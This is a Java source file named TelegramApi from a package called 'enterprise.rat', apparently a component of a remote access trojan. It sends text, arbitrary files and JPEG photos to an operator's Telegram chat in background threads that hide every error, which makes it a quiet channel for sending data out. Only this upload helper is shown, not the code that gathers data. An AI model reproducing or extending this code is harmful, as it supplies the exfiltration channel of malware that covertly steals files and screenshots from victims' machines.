package com.enterprise.rat.utils;

import com.enterprise.rat.bot.BotConfig;
import okhttp3.*;
import java.io.File;
import java.util.concurrent.TimeUnit;

public class TelegramApi {
    private static final OkHttpClient client = new OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .build();

    public static void sendMessage(String text) {
        new Thread(() -> {
            try {
                RequestBody body = new FormBody.Builder()
                        .add("chat_id", String.valueOf(BotConfig.ADMIN_CHAT_ID))
                        .add("text", text)
                        .add("parse_mode", "HTML")
                        .build();
                Request request = new Request.Builder()
                        .url(BotConfig.API_BASE_URL + "sendMessage")
                        .post(body).build();
                client.newCall(request).execute();
            } catch (Exception e) {}
        }).start();
    }

    public static void sendFile(File file, String caption) {
        new Thread(() -> {
            try {
                RequestBody fileBody = RequestBody.create(file, MediaType.parse("application/octet-stream"));
                RequestBody requestBody = new MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("chat_id", String.valueOf(BotConfig.ADMIN_CHAT_ID))
                        .addFormDataPart("caption", caption)
                        .addFormDataPart("document", file.getName(), fileBody)
                        .build();
                Request request = new Request.Builder()
                        .url(BotConfig.API_BASE_URL + "sendDocument")
                        .post(requestBody).build();
                client.newCall(request).execute();
            } catch (Exception e) {}
        }).start();
    }

    public static void sendPhoto(File file, String caption) {
        new Thread(() -> {
            try {
                RequestBody fileBody = RequestBody.create(file, MediaType.parse("image/jpeg"));
                RequestBody requestBody = new MultipartBody.Builder()
                        .setType(MultipartBody.FORM)
                        .addFormDataPart("chat_id", String.valueOf(BotConfig.ADMIN_CHAT_ID))
                        .addFormDataPart("caption", caption)
                        .addFormDataPart("photo", file.getName(), fileBody)
                        .build();
                Request request = new Request.Builder()
                        .url(BotConfig.API_BASE_URL + "sendPhoto")
                        .post(requestBody).build();
                client.newCall(request).execute();
            } catch (Exception e) {}
        }).start();
    }
}
